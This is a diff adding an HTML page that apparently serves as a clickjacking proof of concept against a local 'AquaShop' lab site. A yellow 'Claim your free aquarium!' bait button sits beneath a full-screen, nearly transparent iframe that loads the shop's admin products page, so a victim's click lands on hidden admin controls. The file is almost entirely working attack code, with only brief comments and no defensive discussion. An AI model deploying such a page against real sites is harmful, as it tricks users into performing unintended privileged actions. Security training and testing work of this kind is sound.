@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Free Gift</title>
+    <style>
+        body { margin: 0; font-family: sans-serif; }
+
+        iframe {
+            position: absolute;
+            top: 0; left: 0;
+            width: 100vw; height: 100vh;
+            opacity: 0.15;      /* semi-transparent so you can see the trick */
+            z-index: 9999;
+            border: 0;
+        }
+
+        .bait {
+            position: absolute;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 1;
+            padding: 30px 60px;
+            background: #ffcc00;
+            border: 4px solid #cc9900;
+            border-radius: 14px;
+            font-size: 28px;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.4);
+        }
+    </style>
+</head>
+<body>
+
+<button class="bait">Claim your free aquarium!</button>
+
+<!-- The real victim: AquaShop admin products page, invisible underneath -->
+<iframe src="http://localhost:8000/admin/products.php"></iframe>
+
+</body>
+</html>
